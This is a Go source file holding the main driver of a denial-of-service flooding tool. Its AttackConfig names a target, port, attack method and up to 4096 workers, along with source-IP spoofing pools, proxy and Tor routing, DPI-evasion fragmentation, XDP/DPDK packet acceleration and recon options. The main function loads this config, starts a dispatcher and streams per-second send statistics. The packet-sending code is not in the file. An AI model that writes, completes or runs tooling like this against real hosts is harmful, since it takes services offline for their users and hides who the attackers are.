package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"
)

type AttackConfig struct {
	Target              string   `json:"target"`
	Port                int      `json:"port"`
	Method              string   `json:"method"`
	Workers             int      `json:"workers"`
	RateLimit           int      `json:"rate_limit"`
	Duration            int      `json:"duration"`
	SpoofIP             string   `json:"spoof_ip"`
	SpoofPool           []string `json:"spoof_pool"`
	ProxyList           []string `json:"proxy_list"`
	Jitter              int      `json:"jitter"`
	Interfaces          []string `json:"interfaces"`
	AutoSwitch          bool     `json:"auto_switch"`
	AdaptiveRate        bool     `json:"adaptive_rate"`
	CorePin             bool     `json:"core_pin"`
	XDPEnable           bool     `json:"xdp_enable"`
	DPDKEnable          bool     `json:"dpdk_enable"`
	MethodList          []string `json:"method_list"`
	H2ConcurrentStreams int      `json:"h2_concurrent_streams"`
	DpiFragmentCount    int      `json:"dpi_fragment_count"`
	Size                int      `json:"size"`
	MixRatio            string   `json:"mix_ratio"`
	Mask                bool     `json:"mask"`
	TorProxy            string   `json:"tor_proxy"`
	Recon               bool     `json:"recon"`
	Pattern             string   `json:"pattern"`
}

type WorkerStats struct {
	Sent      int64  `json:"sent"`
	Errors    int64  `json:"errors"`
	Active    int    `json:"active"`
	Rate      int    `json:"rate"`
	Method    string `json:"method,omitempty"`
	Interface string `json:"interface,omitempty"`
}

func errf(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, format, args...)
	os.Stderr.Sync()
}

func warnf(format string, args ...interface{}) {
	fmt.Fprintf(os.Stdout, format, args...)
	os.Stdout.Sync()
}

func infof(format string, args ...interface{}) {
	fmt.Fprintf(os.Stdout, format, args...)
}

func main() {
	if len(os.Args) < 2 {
		errf(`{"error":"usage: engine <config.json>"}` + "\n")
		os.Exit(1)
	}
	data, err := os.ReadFile(os.Args[1])
	if err != nil {
		errf(`{"error":"read config: %v"}`+"\n", err)
		os.Exit(1)
	}
	var cfg AttackConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		errf(`{"error":"parse config: %v"}`+"\n", err)
		os.Exit(1)
	}
	if cfg.Workers < 1 {
		cfg.Workers = 10
	}
	if cfg.Workers > 4096 {
		cfg.Workers = 4096
	}
	if cfg.RateLimit < 1 {
		cfg.RateLimit = 1000
	}
	if cfg.Duration < 1 {
		cfg.Duration = 30
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	status := make(chan WorkerStats, cfg.Workers)
	done := make(chan struct{})

	dispatcher := NewDispatcher(&cfg, status)
	go dispatcher.Run(done)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var totalSent int64
	start := time.Now()

	emit := func(s WorkerStats) {
		totalSent += s.Sent
		out := map[string]interface{}{
			"type":     "stats",
			"sent":     totalSent,
			"errors":   s.Errors,
			"rate":     s.Rate,
			"active":   s.Active,
			"elapsed":  int(time.Since(start).Seconds()),
			"method":   s.Method,
			"iface":    s.Interface,
		}
		b, _ := json.Marshal(out)
		fmt.Println(string(b))
		os.Stdout.Sync()
	}

	for {
		select {
		case s := <-status:
			if s.Sent >= 0 || s.Errors >= 0 {
				emit(s)
			}
		case <-ticker.C:
			select {
			case s := <-status:
				emit(s)
			default:
			}
		case <-sig:
			fmt.Println(`{"type":"stop","message":"interrupted by user"}`)
			dispatcher.Stop()
			return
		case <-done:
			fmt.Println(`{"type":"done","sent":` +
				fmt.Sprintf("%d", totalSent) +
				`,"elapsed":` +
				fmt.Sprintf("%d", int(time.Since(start).Seconds())) +
				`}`)
			return
		}
	}
}
